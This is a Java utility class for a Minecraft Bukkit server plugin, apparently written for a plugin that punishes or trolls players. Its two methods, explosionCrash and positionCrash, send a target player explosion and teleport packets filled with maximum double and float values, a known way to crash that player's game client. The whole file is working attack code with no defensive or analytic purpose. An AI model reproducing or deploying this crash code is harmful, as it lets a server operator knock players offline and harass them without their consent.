package top.wyh2004.baka.utils;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.List;
import java.util.Set;

/**
 * @author WYH2004
 * @date 2023/1/12
 **/
public class CrashClientUtils {
    private static final String serverVersion;

    static {
        String path = Bukkit.getServer().getClass().getPackage().getName();
        serverVersion = path.substring(path.lastIndexOf(".") + 1);
    }

    public static Boolean explosionCrash(Player p){
        try{
            Class<?> Vec3D = Class.forName("net.minecraft.server." + serverVersion + ".Vec3D");
            Constructor<?> vec3DConstructor = Vec3D.getConstructor(double.class, double.class, double.class);
            Object vec3d = vec3DConstructor.newInstance(doubleMax(), doubleMax(), doubleMax());

            Class<?> PacketPlayOutExplosion = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutExplosion");
            Constructor<?> playOutConstructor = PacketPlayOutExplosion.getConstructor(double.class, double.class, double.class, float.class, List.class, Vec3D);
            Object explosionPacket = playOutConstructor.newInstance(doubleMax(), doubleMax(), doubleMax(), floatMax(), Collections.emptyList(), vec3d);

            sendPacket(p, explosionPacket);
            return true;
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
    }

    public static boolean positionCrash(Player p){
        try {
            Class<?> PacketPlayOutPosition = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutPosition");
            Constructor<?> playOutPositionConstructor = PacketPlayOutPosition.getConstructor(double.class, double.class, double.class, float.class, float.class, Set.class);
            Object posPacket = playOutPositionConstructor.newInstance(doubleMax(), doubleMax(), doubleMax(), floatMax(), floatMax(), Collections.emptySet());

            sendPacket(p, posPacket);
            return true;
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
    }

    private static void sendPacket(Player player, Object packet) throws Exception {

        Class<?> craftPlayer = Class.forName("org.bukkit.craftbukkit." + serverVersion + ".entity.CraftPlayer");
        Object craftPlayerObject = craftPlayer.cast(player);

        Method getHandleMethod = craftPlayer.getMethod("getHandle");
        Object handle = getHandleMethod.invoke(craftPlayerObject);
        Object pc = handle.getClass().getField("playerConnection").get(handle);

        Class<?> Packet = Class.forName("net.minecraft.server." + serverVersion + ".Packet");
        Method sendPacketMethod = pc.getClass().getMethod("sendPacket", Packet);

        sendPacketMethod.invoke(pc, packet);

    }

    private static Double doubleMax() {
        return Double.MAX_VALUE;
    }

    private static Float floatMax() {
        return Float.MAX_VALUE;
    }
}
